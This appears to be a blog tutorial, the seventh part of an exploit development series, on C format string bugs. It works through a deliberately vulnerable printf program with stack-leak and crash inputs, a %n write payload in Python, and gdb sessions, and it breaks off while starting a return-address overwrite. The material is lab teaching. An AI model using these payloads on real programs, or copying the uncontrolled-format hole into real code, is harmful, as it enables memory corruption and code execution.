<!DOCTYPE html>
<html lang="en">
  <head>
    <meta http-equiv='cache-control' content='no-cache'> 
    <meta http-equiv='expires' content='0'> 
    <meta http-equiv='pragma' content='no-cache'>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta
      name="description"
      content=""
    />
    
      
        <title>[Exploit development] 7- How to do magic with string format bugs | 0xNinjaCyclone Blog</title>
      
    
    <link rel="stylesheet" href="/css/reset.css"/>
    <link rel="stylesheet" href="/css/font.css"/>
    <link rel="stylesheet" href="/css/smigle2.css"/>
    
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-180x180.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/fav-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/fav-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="safary-1120x1120.png" color="#5bbad5">
    <meta name="msapplication-TileColor" content="#da532c">
    <meta name="theme-color" content="#ffffff">
  </head>
  
  <body>
    <div id="root">
      <header>
  <div id="brand">
    <a class="icon-link" href="https://0xninjacyclone.github.io/">
      <img
        class="icon"
        src="/images/logo.png"
      />
    </a>
    <div class="text">
      <a href="https://0xninjacyclone.github.io/"><h1>0xNinjaCyclone Blog</h1></a>
      <h3>Penetration tester and Red teamer</h3>
    </div>
  </div>
  <nav>
    
      
        
        <a href="/"><b>Home</b></a>
      
         | 
        <a href="/about/"><b>About</b></a>
      
         | 
        <a href="/categories/"><b>Categories</b></a>
      
         | 
        <a href="/tags/"><b>Tags</b></a>
      
    
  </nav>
  <hr />
</header>

      <div id="content">
        
  <main>
    <article>
      <h1 class="title">[Exploit development] 7- How to do magic with string format bugs</h1>
      
      <div class="post-meta">
  <strong>
    <span>Posted on</span>
    <time>2024-02-08</time>
    <span>in</span>
    
      <a href="/categories/exploitdev">exploitdev</a>
  </strong>
  <span> • 4622 words</span>
  <span> • 22 minute read</span>
  
  
    <div>
      <span>Tags:</span>
      
        <a href="/tags/exploit-development">exploit-development</a>, 
        <a href="/tags/binary-exploitation">binary-exploitation</a>, 
        <a href="/tags/vulnerability-research">vulnerability-research</a>, 
        <a href="/tags/string-format">string-format</a>
    </div>
  
</div>

      <div class="content"><h2 id="intro">Intro</h2>
<p>Welcome everyone, to the seventh part of the exploit development series. In this article, we will discuss the string format vulnerability and the scientific and programming concepts behind it. This will lead us to answer many questions, such as why it occurs and how to make the most of it and exploit it optimally.</p>
<p>In the beginning, I would like to say that this type of vulnerabilities has become very rare to occur, but the concepts that you will learn will definitely benefit you, increase your skills as an exploit developer, and improve your way of thinking and methodology.</p>
<h2 id="variable-length-argument-in-c">Variable Length Argument in C</h2>
<p>C programming language supports a feature called &ldquo;Variable Length Argument&rdquo;, this feature allows a function to explicitly receive any number of arguments at runtime. This feature is clearly visible in functions such as <code>printf</code>, <code>fprintf</code>, and <code>sprintf</code>. If you have ever used one of these methods, you will notice that we can smoothly pass many arguments to them, that happens because the feature we&rsquo;re talking about. Understanding this feature very well is the key to understand the vulnerability of today and the amazing exploitation techniques of it.</p>
<h3 id="practical-example-for-variable-length-argument-feature">Practical example for Variable Length Argument feature</h3>
<p>Let&rsquo;s explore a practical example in C to clarify:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdarg.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">SayHello</span>(<span style="color:#66d9ef">int</span> nSize, ...)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    va_list ap;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">va_start</span>( ap, nSize );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( nSize<span style="color:#f92672">--</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>( <span style="color:#e6db74">&#34;Hello %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">va_arg</span>(ap, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">va_end</span>( ap );
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SayHello</span>( <span style="color:#ae81ff">3</span>, <span style="color:#e6db74">&#34;Abdallah&#34;</span>, <span style="color:#e6db74">&#34;Hamza&#34;</span>, <span style="color:#e6db74">&#34;Hossam&#34;</span> );
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Let&rsquo;s compile this program and show you the output.</p>
<pre tabindex="0"><code>┌──(abdallah㉿pc)-[~/path/to]
└─$ gcc VarLenArg.c -o VarLenArg

┌──(abdallah㉿pc)-[~/path/to]
└─$ ./VarLenArg 
Hello Abdallah
Hello Hamza
Hello Hossam
</code></pre><h3 id="how-does-the-variable-length-argument-feature-work-">How does the Variable Length Argument feature work ?</h3>
<p>When the <code>SayHello</code> function is called, a new stack frame will be initialized above the main&rsquo;s stack frame, the explicitly passed arguments will be pushed onto that stack frame and the stack layout will become as follows.</p>
<center><img src="/imgs/stack_layout.png" width="512"/></center>
<p>As You understood from the picture, what <code>va_start</code> macro did is give us a pointer to that area within the stack where our arguments live, and <code>va_arg</code> macro crawls the stack and gives us our data whatever its type, because the size of the required data can be simply calculated and cast by the macro depending on the second parameter it need. Let&rsquo;s run the program under <code>gdb</code> to see what happens exactly.</p>
<pre tabindex="0"><code>gdb -nx -q ./VarLenArg
b SayHello
r
disas SayHello
</code></pre><center><img src="/imgs/gdb_disas_sayhello.png" width="722"/></center>
<p>The mentioned instructions are responsible for pushing the arguments onto the stack, let&rsquo;s give the gdb an order to execute them, and examming the stack via the following commands.</p>
<pre tabindex="0"><code>stepi 7
x/3a $rbp-0xa8
x/s 0x55555555601b
x/s 0x555555556015
x/s 0x55555555600e
</code></pre><center><img src="/imgs/gdb_x_stack.png" width="512"/></center>
<p>Well, but what about Windows OS? Does that feature work as same as Linux, or are they different? Let us compile the example code on Windows and reverse it to explore that feature and understand how it exactly works.</p>
<center><img src="/imgs/imu_disas_sayhello.png" width="722"/></center>
<p>Let&rsquo;s explain the picture and understand it, first, the procedure obtains a pointer that points to what is behind our data in the stack via <strong>Load Effective Address</strong> instruction, notice that the value of the <strong>EDI</strong> register contains now that address, and then the function enters a loop. What the iteration loop does is decrease the value of <strong>ESI</strong> which is the <code>nSize</code> variable that tells the function how many arguments have been passed to it, then the RDI will jump four bytes <strong>(the size of addresses in 32-bit systems)</strong> to point to the data which in the stack that passed through the function call, after that some parameters will be pushed onto the stack (that decreases <strong>ESP</strong> automatically) and <code>printf</code> function will be called via <code>EBX</code> that contains its address as appear in the picture, then the <strong>stack pointer</strong> will bring down again and the function will check if the <code>ESI</code> became zero if not, the code will jump to up and doing what we&rsquo;ve explained again and continue in crawling the stack until the <code>ESI</code> breaks the loop.</p>
<p>There is nothing new. What we explained above on Linux is the same as what happens on Windows. But doesn&rsquo;t the explanation draw your attention to something? Let&rsquo;s ask the question in another way: What if we could force the loop to continue processing more data than is actually in the stack? An amazing scenario and this is the idea behind string format vulnerabilities.</p>
<h2 id="string-format-bugs">String Format Bugs</h2>
<p>Most string format functions in C programming language such as <code>scanf</code>, <code>printf</code>, <code>sprintf</code>, and <code>syslog</code> are using the <strong>Variable Length Argument</strong> feature to allow users to format their data easily whatever the type of the data. Also, some <strong>Interpreters</strong> and <strong>Virtual Machines</strong> like Python language use internally that feature in <strong>APIs</strong> such as <code>PyArg_Parse</code>, <code>PyArg_ParseTupleAndKeywords</code>, <code>PyArg_ParseTuple</code>, and a lot more. String format functions take exactly a punch of format specifiers in a string, each specifier represents data of a specific type on the stack, based on that format, the functions retrieve and process the data. However, the bug occurs when users can control that format by passing their own.</p>
<h3 id="vulnerable-code">Vulnerable code</h3>
<p>Let me show you a simple example of code vulnerable to the string format bug, so we can learn about the vulnerability and how to benefit from it and exploit it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vulnerable</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>cpStr)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>( cpStr );
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[])
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>secret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;This is a top secret data `_`&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( argc <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">vulnerable</span>( argv[<span style="color:#ae81ff">1</span>] );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>That&rsquo;s a so basic code that takes its input from command line arguments, if the user has passed an input will display it on the screen.</p>
<pre tabindex="0"><code>┌──(abdallah㉿pc)-[~]
└─$ gcc test.c -o test

┌──(abdallah㉿pc)-[~]
└─$ ./test &#34;Hello World!&#34;
Hello World!
┌──(abdallah㉿pc)-[~]
└─$ 
</code></pre><p>But when analyzing that and starting exploring the manual page of the <code>printf</code> function and getting its declaration will see that:</p>
<pre tabindex="0"><code>int printf(const char *restrict format, ...);
</code></pre><p><strong>DAMN</strong>, We actually control the format that leads the function in dealing with the args in the stack, that means we can completely hijack the execution flow of the function and trick it to crawls the stack and leaking sensitive data from it or doing dangerous stuff depending on the features that the function provides us.</p>
<h2 id="exploitation">Exploitation</h2>
<p>Let&rsquo;s inject a malicious format and see what happen:</p>
<pre tabindex="0"><code>┌──(abdallah㉿pc)-[~]
└─$ ./test &#39;===&gt; { %p %p %p %p %p } &lt;===&#39;
===&gt; { 0x7ffedfe63098 0x7ffedfe630b0 0x7fc931c9d738 (nil) 0x7fc931cdb1f0 } &lt;===
┌──(abdallah㉿pc)-[~]
└─$ 
</code></pre><p>As you see we can successfully trick the function to crawl the stack and obtain valuable data from it.</p>
<h3 id="crashing-the-application">Crashing the application</h3>
<p>First, let&rsquo;s generate a format that prints out 30 address from the stack using this command <code>python3 -c 'print(&quot;%p &quot; * 30)'</code> and passing that as a payload into the program.</p>
<pre tabindex="0"><code>┌──(abdallah㉿pc)-[~]
└─$ ./test &#39;%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p&#39;
0x7fff1c7ba4f8 0x7fff1c7ba510 0x7f1577cc5738 (nil) 0x7f1577d031f0 (nil) 0x7fff1c7bc396 0x7fff1c7ba400 0x562cb2db81b2 0x7fff1c7ba4f8 0x2b2db8060 0x7fff1c7ba4f0 0x562cb2db9010 (nil) 0x7f1577b1e7fd 0x7fff1c7ba4f8 0x21c7fc000 0x562cb2db817f 0x7fff1c7ba809 0x562cb2db81c0 0x3e09cd93ee28e7d0 0x562cb2db8060 (nil) (nil) (nil) 0xc1f7f564a608e7d0 0xc02322f02144e7d0 (nil) (nil) (nil)
┌──(abdallah㉿pc)-[~]
└─$ 
</code></pre><p>As you see, the fourth and sixth pointers are <code>NULL</code>, we can target them only as follows:</p>
<pre tabindex="0"><code>┌──(abdallah㉿pc)-[~]
└─$ ./test &#39;%4$p&#39;
(nil)
┌──(abdallah㉿pc)-[~]
└─$ ./test &#39;%6$p&#39;
(nil)
┌──(abdallah㉿pc)-[~]
└─$ 
</code></pre><p>Great, the function supports <code>%s</code> format specifier that allows developers to format strings with other data, that means the function will dereference the string pointer that points to the characters but what if we forced it to dereference an invalid pointer like the eleventh pointer ?? let&rsquo;s test it and see what going to happen.</p>
<pre tabindex="0"><code>┌──(abdallah㉿pc)-[~]
└─$ ./test &#39;%11$s&#39;
Segmentation fault

┌──(abdallah㉿pc)-[~]
└─$ 
</code></pre><p><strong>BINGO</strong>, We crashed the program and forced it to stop and never complete its task. There are more methods such as <code>%n</code> to force the program to crash.</p>
<h3 id="leaking-sensitive-data">Leaking sensitive data</h3>
<p>Let&rsquo;s try to leak the secret variable within the main function. First, we need to determine from where we start reading and the position of the targeted data, let&rsquo;s run the program under gdb and try exploring that needed information.</p>
<pre tabindex="0"><code>gdb -nx -q ./test
b main
r &#34;%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p&#34;
disas main
b *0x00005555555551ad
c
x/a $rbp-0x8
x/s 0x555555556010
</code></pre><center><img src="/imgs/gdb_leak_secret.png" width="842"/></center>
<p>First, we let the main function execute the code responsible for putting the targeted data onto the stack, when we examine the stack we clearly see that the targteted pointer lives in <code>0x7fffffffdf18</code> within the stack. Now we are in the step before calling the vulnerable function let&rsquo;s continue.</p>
<pre tabindex="0"><code>si 8
disas vulnerable
</code></pre><p>Depending on the size of the vulnerable stack frame, we start reading the stack to determine from where exactly the printf function starts reading as shown in the picture below.</p>
<center><img src="/imgs/gdb_disas_leak_secret.png" width="1366"/></center>
<p>As shown in the picture the function starts reading from <code>$rbp-0x38</code>, so we start calculating the secret data offset from the address that the function start reading from.</p>
<center><img src="/imgs/gdb_p_off.png" width="499"/></center>
<p>Well, we&rsquo;ve added one to the five missing pointers at first ( because format specifiers start accessing from one not zero ) multiplied by the pointer&rsquo;s size which is eight. Let&rsquo;s run the program again and inject <code>%13$s</code> as a payload.</p>
<center><img src="/imgs/leak_secret.png" width="400"/></center>
<p><strong>BINGO</strong>, We could dynamically force the <code>printf</code> function to leak targeted secret data from the stack.</p>
<h3 id="redirecting-execution-flow">Redirecting execution flow</h3>
<p>In order to control the flow of program execution or arbitrarily execute specific code or function, we must overwrite one of the function pointers or poison the <strong>Goblal Offset Table</strong>. We can also do the same thing by overwriting the instruction pointer that is in the stack, but the question now is how can we exploit the vulnerability to do that.</p>
<p>String format functions support an interesting feature or specifier called <code>%n</code>, that specifier requires an int pointer and writes in that variable how many characters have been processed by the function. This is a great feature that should be exploited since we have control over which variable we want to target, as we explained before, and we are able to read specific data from the stack. We can also target any data or position within the stack to overwrite it via that feature. We can write the data or addresses that we specifically want by passing the appropriate number of characters to the function. This is difficult to do manually and requires developing an automation script that exploits the bug in any programming language such as Python or Ruby. Let&rsquo;s try to exploit the following program:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> deadvar <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">pwnme</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>( <span style="color:#e6db74">&#34;/bin/sh&#34;</span> );
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vulnerable</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> cStrFmt[<span style="color:#ae81ff">8192</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>( cStrFmt, <span style="color:#66d9ef">sizeof</span>(cStrFmt), stdin );
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>( cStrFmt );
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">vulnerable</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( deadvar <span style="color:#f92672">==</span> <span style="color:#ae81ff">1337</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;This branch should never be accessed yet !!!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;You won ^_^&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Compile using <code>gcc -m32 test.c -o test</code> to prepare our test case:</p>
<pre tabindex="0"><code>┌──(abdallah㉿pc)-[~]
└─$ python3 -c &#34;print(&#39;A&#39; * 16 + &#39; %p&#39; * 30)&#34; | ./test
AAAAAAAAAAAAAAAA 0x2000 0xf7f9a580 0x56556207 0x41414141 0x41414141 0x41414141 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0xa7025
</code></pre><p>Great, it&rsquo;s vulnerable and we can inject our malicious payloads/formats via stdin. As you see from the output above our malicious format goes to the stack in the fourth parameter, let&rsquo;s ensure that:</p>
<pre tabindex="0"><code>┌──(abdallah㉿pc)-[~]
└─$ echo &#39;AAAAA%4$p&#39; | ./test
AAAAA0x41414141
</code></pre><p>Well, remember that because we going to abuse this fact later. Now as shown in the vulnerable code snippet, the conditional branch inside the <code>main</code> function is designed to be unreachable because the condition will never be true, let us fulfill the condition by overwriting the <code>deadvar</code>. First, we need to disable ASLR to make sure nothing will stop us, we can use this command to disable it:</p>
<pre tabindex="0"><code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
</code></pre><p>We must now obtain the address of the <code>deadvar</code> variable in the memory through gdb to overwrite it, this is very simple we can do it as follows:</p>
<pre tabindex="0"><code>(gdb) p &amp;deadvar
$1 = (&lt;data variable, no debug info&gt; *) 0x5655902c &lt;deadvar&gt;
</code></pre><p>Great, things are going well. Now to successfully develop our exploit we need to make <code>printf</code> function print out 1337 characters on the screen. Moreover, we need to passing the <code>deadvar</code> address to the <code>printf</code> as a paramter to overwrite it. The question now how we can do it? Umm, Our options are not that many because the program is very small and does not take a lot of input, but did you remember when i told you that our format goes to the stack? we can abuse this fact to implicitly pass the targted address to the <code>printf</code> function. We can also abuse environment variables, but we will not use this way now. Let&rsquo;s start developing our exploit based on the first method, by poisoning the format:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#75715e"># Author     ==&gt; Abdallah Mohamed (0xNinjaCyclone)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x5655902c &lt;== target (deadvar)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2c\x90\x55\x56</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># deadvar address in little endian format</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> ( <span style="color:#ae81ff">1337</span> <span style="color:#f92672">-</span> len(payload) ) 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%4$n&#34;</span> <span style="color:#75715e"># pass the deadvar address as a parameter to printf</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;exploit.txt&#34;</span>, <span style="color:#e6db74">&#34;wb+&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(payload)
</span></span></code></pre></div><p>Let&rsquo;s try it under gdb and see what going to happen:</p>
<pre tabindex="0"><code>┌──(abdallah㉿pc)-[~]
└─$ gdb -nx -q ./test
Reading symbols from ./test...
(No debugging symbols found in ./test)
(gdb) b main
Breakpoint 1 at 0x1254
(gdb) r &lt; exploit.txt
Starting program: /home/abdallah/test &lt; exploit.txt

Breakpoint 1, 0x56556254 in main ()
(gdb) disas main
Dump of assembler code for function main:
   0x56556245 &lt;+0&gt;:	lea    0x4(%esp),%ecx
   0x56556249 &lt;+4&gt;:	and    $0xfffffff0,%esp
   0x5655624c &lt;+7&gt;:	push   -0x4(%ecx)
   0x5655624f &lt;+10&gt;:	push   %ebp
   0x56556250 &lt;+11&gt;:	mov    %esp,%ebp
   0x56556252 &lt;+13&gt;:	push   %ebx
   0x56556253 &lt;+14&gt;:	push   %ecx
=&gt; 0x56556254 &lt;+15&gt;:	call   0x565560d0 &lt;__x86.get_pc_thunk.bx&gt;
   0x56556259 &lt;+20&gt;:	add    $0x2da7,%ebx
   0x5655625f &lt;+26&gt;:	call   0x565561f8 &lt;vulnerable&gt;
   0x56556264 &lt;+31&gt;:	mov    0x2c(%ebx),%eax
   0x5655626a &lt;+37&gt;:	cmp    $0x539,%eax
   0x5655626f &lt;+42&gt;:	jne    0x56556295 &lt;main+80&gt;
   0x56556271 &lt;+44&gt;:	sub    $0xc,%esp
   0x56556274 &lt;+47&gt;:	lea    -0x1ff0(%ebx),%eax
   0x5655627a &lt;+53&gt;:	push   %eax
   0x5655627b &lt;+54&gt;:	call   0x56556050 &lt;puts@plt&gt;
   0x56556280 &lt;+59&gt;:	add    $0x10,%esp
   0x56556283 &lt;+62&gt;:	sub    $0xc,%esp
   0x56556286 &lt;+65&gt;:	lea    -0x1fc3(%ebx),%eax
   0x5655628c &lt;+71&gt;:	push   %eax
   0x5655628d &lt;+72&gt;:	call   0x56556050 &lt;puts@plt&gt;
   0x56556292 &lt;+77&gt;:	add    $0x10,%esp
   0x56556295 &lt;+80&gt;:	nop
   0x56556296 &lt;+81&gt;:	lea    -0x8(%ebp),%esp
   0x56556299 &lt;+84&gt;:	pop    %ecx
   0x5655629a &lt;+85&gt;:	pop    %ebx
   0x5655629b &lt;+86&gt;:	pop    %ebp
   0x5655629c &lt;+87&gt;:	lea    -0x4(%ecx),%esp
   0x5655629f &lt;+90&gt;:	ret    
End of assembler dump.
(gdb) b *0x56556264
Breakpoint 2 at 0x56556264
(gdb) p (int) deadvar
$1 = 0
</code></pre><p>We have two breakpoints, one on the <code>main</code> function and another one after calling the <code>vulnerable</code> function. Now the <code>deadvar</code> is zero as shown above. Let&rsquo;s continue:</p>
<pre tabindex="0"><code>(gdb) c
Continuing.
,�UVAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Breakpoint 2, 0x56556264 in main ()
(gdb) p (int) deadvar
$2 = 1337
</code></pre><p>Great, things are going well. We could successfully overwrite the <code>deadvar</code> variable and the condition should now be met and the unaccessible code will be executed, let&rsquo;s continue and see what going on.</p>
<pre tabindex="0"><code>(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAThis branch should never be accessed yet !!!
You won ^_^
[Inferior 1 (process 5287) exited with code 014]
</code></pre><p>We succeeded, guys, and we were able to change the execution flow of the program. Next step let&rsquo;s try to call <code>pwnme</code> function and get a shell, firstly, we have to obtain its address via p command using gdb:</p>
<pre tabindex="0"><code>(gdb) p pwnme
$1 = {&lt;text variable, no debug info&gt;} 0x565561cd &lt;pwnme&gt;
</code></pre><p>Well, we&rsquo;ve got the address we need, let&rsquo;s modify our exploit. Unfortunately, there is a problem with writing the pwnme address to the instruction pointer we need to make the <code>printf</code> function print out hundreds of millions of characters on the screen to write the pwnme address on the targeted area successfully. This is crazy, this can effectively kill the terminal or crash the program. We need to think deeply and find another way. How can we solve this problem? Fortunately, string format functions support writing the number of processed characters to a short variable using <code>%hn</code> format specifier. So we can divide the writing into two stages. In the first stage we write one part and then we write another part. This will reduce the number of characters to be printed on the screen. Let&rsquo;s do it.</p>
<p>The first step is obtaining the return address to target it, this is not difficult we can grab it as follows:</p>
<pre tabindex="0"><code>┌──(abdallah㉿pc)-[~]
└─$ gdb -nx -q ./test
Reading symbols from ./test...
(No debugging symbols found in ./test)
(gdb) b vulnerable 
Breakpoint 1 at 0x11fc
(gdb) r
Starting program: /home/abdallah/test 

Breakpoint 1, 0x565561fc in vulnerable ()
(gdb) x/a $ebp+0x4
0xffffd13c:	0x56556264 &lt;main+31&gt;
</code></pre><p>Very nice. our target is <code>0xffffd13c</code> address and we should write <code>0x565561cd</code> to it, let&rsquo;s try to do it and develop the exploit.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#75715e"># Author     ==&gt; Abdallah Mohamed (0xNinjaCyclone)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0xffffd13c &lt;== target (return address pointer)</span>
